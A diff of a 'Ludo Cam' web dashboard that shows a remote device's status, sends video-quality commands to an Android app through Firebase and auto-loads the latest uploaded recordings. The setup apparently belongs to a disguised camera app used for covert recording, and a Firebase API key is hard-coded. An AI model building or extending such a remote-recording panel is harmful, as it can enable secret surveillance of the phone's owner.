@@ -3,99 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Ludo Cam - Live</title>
+    <title>Ludo Cam - Live Stream</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             padding: 20px;
         }
+
         .container {
-            max-width: 600px;
-            margin: 0 auto;
+            width: 100%;
+            max-width: 550px;
+            background: #0f0f0f;
+            border-radius: 32px;
+            overflow: hidden;
+            border: 1px solid #222;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
         }
+
+        /* Header */
         .header {
-            text-align: center;
-            margin-bottom: 20px;
             padding: 20px;
             background: #141414;
-            border-radius: 24px;
-            border: 1px solid #222;
+            text-align: center;
+            border-bottom: 1px solid #222;
         }
-        h1 { color: #fff; font-size: 28px; }
-        h1 span { color: #00ff88; }
-        .status-card {
-            background: #1a1a1a;
-            padding: 16px 20px;
-            border-radius: 20px;
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .logo span {
+            color: #00ff88;
+        }
+
+        /* Status Bar */
+        .status-bar {
+            padding: 14px 20px;
+            background: #0f0f0f;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
-            border: 1px solid #333;
+            border-bottom: 1px solid #222;
         }
+
         .status-item {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
         }
+
         .dot {
-            width: 12px;
-            height: 12px;
+            width: 10px;
+            height: 10px;
             border-radius: 50%;
-            transition: all 0.2s;
+            transition: all 0.2s ease;
         }
-        .dot.red { background: #ff4444; box-shadow: 0 0 8px #ff4444; }
-        .dot.green { background: #00ff88; box-shadow: 0 0 8px #00ff88; }
-        .status-text { color: #fff; font-size: 14px; font-weight: 500; }
-        .device-name { color: #00ff88; font-size: 12px; font-family: monospace; }
+
+        .dot.red {
+            background: #ff4444;
+            box-shadow: 0 0 8px #ff4444;
+        }
+
+        .dot.green {
+            background: #00ff88;
+            box-shadow: 0 0 8px #00ff88;
+        }
+
+        .status-text {
+            color: #fff;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .device-name {
+            color: #00ff88;
+            font-size: 11px;
+            font-family: monospace;
+        }
+
+        /* Quality Bar */
         .quality-bar {
+            padding: 12px 20px;
             background: #1a1a1a;
-            padding: 12px 16px;
-            border-radius: 20px;
-            margin-bottom: 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
+            border-bottom: 1px solid #222;
         }
-        .quality-label { color: #888; font-size: 12px; }
+
+        .quality-label {
+            color: #888;
+            font-size: 12px;
+        }
+
         .quality-select {
             background: #2a2a2a;
             border: 1px solid #444;
             color: #fff;
-            padding: 8px 16px;
-            border-radius: 24px;
-            font-size: 13px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
             cursor: pointer;
         }
-        .quality-select:hover { border-color: #00ff88; }
+
+        .quality-select:hover {
+            border-color: #00ff88;
+        }
+
+        /* Video Section */
         .video-section {
+            padding: 20px;
+            background: #000;
+        }
+
+        .video-wrapper {
+            position: relative;
             background: #000;
             border-radius: 20px;
             overflow: hidden;
-            margin-bottom: 20px;
+            aspect-ratio: 16 / 9;
             border: 1px solid #333;
         }
-        .video-title {
-            padding: 12px 16px;
-            background: #1a1a1a;
-            color: #888;
-            font-size: 12px;
-            border-bottom: 1px solid #333;
-        }
-        .video-container {
-            position: relative;
-            background: #000;
-            min-height: 300px;
-        }
+
         video {
             width: 100%;
-            aspect-ratio: 16 / 9;
+            height: 100%;
             object-fit: cover;
         }
+
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0,0,0,0.7);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .play-overlay.hidden {
+            display: none;
+        }
+
+        .play-btn {
+            width: 70px;
+            height: 70px;
+            background: #00ff88;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 25px rgba(0,255,136,0.6);
+            transition: transform 0.2s;
+        }
+
+        .play-btn:active {
+            transform: scale(0.9);
+        }
+
+        .play-btn span {
+            font-size: 35px;
+            color: #000;
+            margin-left: 5px;
+        }
+
         .no-video {
             position: absolute;
             top: 0;
@@ -109,35 +197,45 @@
             font-size: 14px;
             background: #0a0a0a;
         }
-        .refresh-btn {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            background: #00ff88;
-            color: #000;
-            border: none;
-            border-radius: 30px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-bottom: 20px;
-        }
-        .footer {
-            text-align: center;
-            color: #444;
+
+        /* Info Bar */
+        .info-bar {
+            padding: 12px 20px;
+            background: #0f0f0f;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #222;
             font-size: 11px;
-            padding: 16px;
+            color: #666;
+        }
+
+        .auto-refresh {
+            color: #00ff88;
+        }
+
+        .timestamp {
+            font-family: monospace;
+        }
+
+        .footer {
+            padding: 12px;
+            text-align: center;
+            font-size: 10px;
+            color: #444;
+            border-top: 1px solid #222;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Header -->
         <div class="header">
-            <h1>📸 <span>LUDO</span> CAM</h1>
+            <div class="logo">📸 <span>LUDO</span> CAM</div>
         </div>
 
-        <!-- Status Card -->
-        <div class="status-card">
+        <!-- Status Bar -->
+        <div class="status-bar">
             <div class="status-item">
                 <div class="dot red" id="statusDot"></div>
                 <span class="status-text" id="statusText">Offline</span>
@@ -145,9 +243,9 @@
             <div class="device-name" id="deviceName">—</div>
         </div>
 
-        <!-- Quality Control -->
+        <!-- Quality Bar -->
         <div class="quality-bar">
-            <span class="quality-label">🎥 QUALITY</span>
+            <span class="quality-label">🎥 STREAM QUALITY</span>
             <select class="quality-select" id="qualitySelect">
                 <option value="120p">120p (Low)</option>
                 <option value="240p">240p</option>
@@ -158,24 +256,32 @@
 
         <!-- Video Section -->
         <div class="video-section">
-            <div class="video-title">📹 LATEST STREAM</div>
-            <div class="video-container">
-                <video id="liveVideo" controls autoplay muted></video>
+            <div class="video-wrapper">
+                <video id="liveVideo" controls muted></video>
+                <div class="play-overlay" id="playOverlay">
+                    <div class="play-btn" id="playBtn">
+                        <span>▶</span>
+                    </div>
+                </div>
                 <div class="no-video" id="noVideo">Waiting for stream...</div>
             </div>
         </div>
 
-        <button class="refresh-btn" onclick="refreshVideo()">⟳ REFRESH</button>
+        <!-- Info Bar -->
+        <div class="info-bar">
+            <span>📡 <span class="auto-refresh" id="refreshStatus">Auto-refresh: 10s</span></span>
+            <span class="timestamp" id="timestamp">—</span>
+        </div>
 
         <div class="footer">
-            🔒 Auto-refresh every 10 sec • Quality changes take effect on next recording
+            🔒 Live Stream • Auto-refresh every 10 seconds
         </div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
     <script>
-        // ========== FIREBASE CONFIG (APNA DALO) ==========
+        // ========== FIREBASE CONFIG ==========
         const firebaseConfig = {
             apiKey: "AIzaSyBwDAhUS8iqNsM5rMewtwFnQs-s3FcnaoU",
             authDomain: "livecam-4e8b0.firebaseapp.com",
@@ -185,21 +291,25 @@
             messagingSenderId: "315485454659",
             appId: "1:315485454659:android:e5d69c3b9a1a87854c2ff6"
         };
-        // =================================================
+        // ===================================
 
-        // Cloudinary config
-        const API_URL = "/api/photos";  // Vercel serverless function
+        // Cloudinary API URL
+        const API_URL = "/api/photos";
 
-        // DOM elements
+        // DOM Elements
         const statusDot = document.getElementById('statusDot');
         const statusText = document.getElementById('statusText');
         const deviceNameSpan = document.getElementById('deviceName');
         const liveVideo = document.getElementById('liveVideo');
+        const playOverlay = document.getElementById('playOverlay');
+        const playBtn = document.getElementById('playBtn');
         const noVideo = document.getElementById('noVideo');
         const qualitySelect = document.getElementById('qualitySelect');
+        const timestampSpan = document.getElementById('timestamp');
 
         let currentVideoUrl = null;
         let deviceId = null;
+        let autoRefreshInterval = null;
 
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
@@ -231,7 +341,7 @@
             }
         });
 
-        // ========== SEND QUALITY COMMAND TO APK ==========
+        // ========== SEND QUALITY COMMAND ==========
         function sendQualityCommand(quality) {
             if (!deviceId) {
                 console.log('No device online');
@@ -241,24 +351,20 @@
             const commandRef = database.ref(`ludo_cam/commands/${deviceId}`);
             commandRef.set({ quality: quality }).then(() => {
                 console.log(`✅ Quality command sent: ${quality}`);
-                showToast(`Quality set to ${quality}`);
-            }).catch(err => {
-                console.error('Error sending command:', err);
-            });
+                showToastMessage(`Quality set to ${quality}`);
+            }).catch(err => console.error('Error:', err));
         }
 
-        // Quality selector change
         qualitySelect.addEventListener('change', (e) => {
-            const selectedQuality = e.target.value;
-            sendQualityCommand(selectedQuality);
+            sendQualityCommand(e.target.value);
         });
 
-        // Toast notification (simple)
-        function showToast(message) {
+        // Toast notification
+        function showToastMessage(message) {
             const toast = document.createElement('div');
             toast.innerText = message;
             toast.style.position = 'fixed';
-            toast.style.bottom = '80px';
+            toast.style.bottom = '100px';
             toast.style.left = '50%';
             toast.style.transform = 'translateX(-50%)';
             toast.style.backgroundColor = '#00ff88';
@@ -272,12 +378,31 @@
             setTimeout(() => toast.remove(), 2000);
         }
 
+        // ========== VIDEO PLAY HANDLER ==========
+        function setupVideoPlayer() {
+            playOverlay.addEventListener('click', () => {
+                liveVideo.play().then(() => {
+                    playOverlay.classList.add('hidden');
+                }).catch(e => console.log('Play error:', e));
+            });
+            
+            liveVideo.addEventListener('ended', () => {
+                playOverlay.classList.remove('hidden');
+            });
+            
+            liveVideo.addEventListener('pause', () => {
+                if (liveVideo.currentTime === liveVideo.duration) return;
+                playOverlay.classList.remove('hidden');
+            });
+            
+            liveVideo.addEventListener('playing', () => {
+                playOverlay.classList.add('hidden');
+            });
+        }
+
         // ========== FETCH VIDEOS FROM CLOUDINARY ==========
         async function refreshVideo() {
             try {
-                noVideo.style.display = 'flex';
-                liveVideo.style.display = 'none';
-                
                 const response = await fetch(API_URL);
                 const data = await response.json();
                 
@@ -288,32 +413,45 @@
                         currentVideoUrl = latestVideo.url;
                         liveVideo.src = currentVideoUrl;
                         liveVideo.load();
-                        liveVideo.play().catch(e => console.log('Autoplay prevented:', e));
-                        liveVideo.style.display = 'block';
                         noVideo.style.display = 'none';
-                        console.log('✅ Video loaded:', new Date(latestVideo.created_at).toLocaleString());
+                        liveVideo.style.display = 'block';
+                        
+                        // Update timestamp
+                        const date = new Date(latestVideo.created_at);
+                        timestampSpan.innerText = date.toLocaleTimeString();
+                        
+                        // Don't auto-play, show play button
+                        playOverlay.classList.remove('hidden');
                     } else {
-                        liveVideo.style.display = 'block';
                         noVideo.style.display = 'none';
+                        liveVideo.style.display = 'block';
                     }
                 } else {
-                    noVideo.style.display = 'flex';
                     liveVideo.style.display = 'none';
+                    noVideo.style.display = 'flex';
                     noVideo.innerText = 'No videos yet. Waiting for stream...';
+                    timestampSpan.innerText = '—';
                 }
             } catch (error) {
                 console.error('Error fetching videos:', error);
-                noVideo.style.display = 'flex';
                 liveVideo.style.display = 'none';
-                noVideo.innerText = '⚠️ Error loading videos';
+                noVideo.style.display = 'flex';
+                noVideo.innerText = '⚠️ Error loading stream';
             }
         }
 
-        // Auto-refresh every 10 seconds
-        refreshVideo();
-        setInterval(refreshVideo, 10000);
+        // ========== AUTO-REFRESH SETUP (No manual refresh button) ==========
+        function startAutoRefresh() {
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+            refreshVideo();
+            autoRefreshInterval = setInterval(refreshVideo, 10000);
+        }
 
-        console.log('✅ Website ready — Live status + Quality control');
+        // Initialize
+        setupVideoPlayer();
+        startAutoRefresh();
+        
+        console.log('✅ Live Stream Ready — Auto-refresh every 10 seconds');
     </script>
 </body>
-</html>
+    </html>
